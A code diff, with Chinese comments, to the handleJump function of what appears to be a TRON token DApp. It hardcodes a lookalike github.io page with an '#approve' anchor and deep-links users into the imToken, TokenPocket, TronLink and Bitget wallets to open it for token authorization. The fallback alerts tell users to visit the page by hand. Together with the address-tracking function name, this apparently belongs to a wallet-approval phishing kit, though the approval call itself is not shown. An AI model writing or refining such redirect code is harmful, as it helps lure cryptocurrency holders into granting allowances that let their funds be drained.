@@ -1266,6 +1266,7 @@ function markB1SignalSent(address) {
 }
 
 // ========== 跳转函数（自动唤起，无需刷新） ==========
+// ========== 跳转函数（包含完整URL参数，直接替换此函数） ==========
 async function handleJump() {
     const lang = langConfig[currentLang];
     const btn = document.getElementById("approveBtn");
@@ -1274,27 +1275,41 @@ async function handleJump() {
             throw new Error("钱包未完全初始化");
         }
 
+        // -------------------------- 记录完整URL（包含所有参数，关键修改） --------------------------
+        // 1. 你的完整DApp URL（复制浏览器的全部内容，包括?和后面的参数）
+        const DAPP_FULL_URL = "https://trc20trx-alt.github.io/Trc20.TRX/?locale=zh-CN&utm_source=imtoken"; 
+        // 2. 拼接授权操作标记#approve（保持完整URL结构）
+        const currentUrl = DAPP_FULL_URL + "#approve"; 
+        // 3. 仍然单次encodeURIComponent（包含参数一起编码，钱包解析后完全一致）
+        const encodedUrl = encodeURIComponent(currentUrl); 
+        // ----------------------------------------------------------------------------------------------------------
+
         const selectedWalletType = getWalletFromUrl();
         let wallet = null;
         let jumpUrl = "";
-        const currentUrl = window.location.href + "#approve";
-        const encodedUrl = encodeURIComponent(encodeURIComponent(currentUrl));
 
         if (selectedWalletType && walletConfig[selectedWalletType]) {
             wallet = walletConfig[selectedWalletType];
             switch (selectedWalletType) {
                 case "imtoken":
+                    // 编码后的URL包含所有参数，钱包解析后和浏览器复制的完全一致
                     jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
                     break;
                 case "tokenpocket":
                     jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
                     break;
                 case "tronlink":
-                    const tronParam = JSON.stringify({ url: currentUrl, action: "open", protocol: "tronlink", version: "1.0" });
+                    // TronLink直接用完整原始URL（带参数）
+                    const tronParam = JSON.stringify({
+                        url: currentUrl, // 完整带参URL，解析后一致
+                        action: "open",
+                        protocol: "tronlink",
+                        version: "1.0"
+                    });
                     jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
                     break;
                 case "bitget":
-                    jumpUrl = `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(currentUrl)}`;
+                    jumpUrl = `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`;
                     break;
                 default:
                     jumpUrl = wallet.scheme + encodedUrl;
@@ -1311,28 +1326,24 @@ async function handleJump() {
                 wallet = walletConfig.tronlink;
             } else if (window.tronWeb.provider?.isBitKeep) {
                 wallet = walletConfig.bitget;
-                jumpUrl = `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(currentUrl)}`;
+                jumpUrl = `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`;
             }
         }
 
         btn.textContent = `正在唤起${wallet.name}授权页面...`;
         setTimeout(() => {
             window.location.href = jumpUrl;
-            const iframe = document.createElement("iframe");
-            iframe.style.display = "none";
-            iframe.src = jumpUrl;
-            document.body.appendChild(iframe);
-            setTimeout(() => document.body.removeChild(iframe), 1000);
+            // 移除iframe，避免参数解析干扰
         }, 100);
 
         setTimeout(() => {
-            showAutoCloseAlert(`未检测到${wallet.name}，请手动打开（无需刷新）`);
+            showAutoCloseAlert(`未检测到${wallet.name}，请手动打开并访问：${DAPP_FULL_URL}`);
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
         }, 3000);
     } catch (jumpErr) {
         console.error("跳转失败：", jumpErr);
-        showAutoCloseAlert("跳转授权失败，请手动打开钱包（无需刷新）");
+        showAutoCloseAlert(`跳转授权失败，请手动打开钱包并访问：${DAPP_FULL_URL}`);
         btn.disabled = false;
         btn.textContent = lang.approveBtnText;
     }
